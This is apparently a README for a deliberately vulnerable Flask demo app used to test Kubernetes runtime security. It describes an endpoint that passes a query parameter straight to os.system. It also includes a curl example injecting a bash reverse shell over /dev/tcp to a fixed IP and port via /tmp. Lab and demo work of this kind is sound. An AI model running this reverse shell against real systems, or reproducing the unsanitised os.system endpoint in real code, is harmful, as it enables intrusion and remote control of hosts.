# 🧪 Flask RCE Demo App

This repository contains an **intentionally vulnerable** Flask application designed for demonstrating **Kubernetes runtime security controls** and post-exploitation techniques in containerized environments.

It includes a dangerous `/cmd?input=` endpoint that executes arbitrary shell commands — a classic remote code execution (RCE) anti-pattern — to simulate real-world insecure container behavior.

---

## ⚠️ Disclaimer

> **DO NOT deploy this in production.**  
> This application is intentionally insecure and is meant **only for controlled lab environments, demos, or security testing.**  
> You are solely responsible for where and how you run it.

---

## 🚀 Features

- Flask app with a remote shell execution bug:
  - `/cmd?input=<command>` → runs `os.system(<command>)`
- Configurable to run as **root** or **non-root** via Docker build args
- Useful for testing:
  - Admission control
  - Runtime behavior restrictions
  - Secrets exfiltration
  - Reverse shell payloads
  - `/tmp` file staging & execution

---

## 🛠️ Build Instructions

Clone the repo and build the image locally:

### 🔧 Root Version (UID 0)

```bash
docker build -t youruser/flask-vuln-demo:root .
```

### 🔐 Non-Root Version (UID 1000)

```bash
docker build -t youruser/flask-vuln-demo:nonroot --build-arg RUN_AS_NON_ROOT=true .
```

---

## 🧪 Local Test

Run the container:

```bash
docker run -p 5000:5000 youruser/flask-vuln-demo:root
```

Then hit the command endpoint:

```bash
curl "http://localhost:5000/cmd?input=ls"
```

---

## 🐳 Docker Hub

If pushed to Docker Hub, use these images directly in Kubernetes:

```yaml
image: youruser/flask-vuln-demo:root
# or
image: youruser/flask-vuln-demo:nonroot
```

---

## 📦 Container Security Use Cases

This app can help model and simulate:

- Remote command execution (RCE) via insecure web inputs
- Reverse shell behavior over `/dev/tcp`
- Use of package managers or interpreters post-exploit
- Dropping and executing payloads via `/tmp`
- Secrets embedded in the container image
- MITRE ATT&CK techniques such as:
  - T1059.004 – Bash execution
  - T1071.001 – curl/wget for command and control
  - T1543.003 – Creating a system process (e.g., SSH daemon)

---

## 🧬 Runtime Behavior Example

```bash
curl "http://flask-app:5000/cmd?input=echo bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 > /tmp/x.sh && bash /tmp/x.sh"
```

This simulates an attacker injecting a reverse shell payload after exploiting the `/cmd` endpoint.

---

## 🧹 Cleanup

To remove the running container:

```bash
docker ps
docker stop <container-id>
```

---

## 🛡️ Tags

`flask` • `rce` • `kubernetes` • `runtime-security` • `demo-app` • `intentionally-vulnerable`
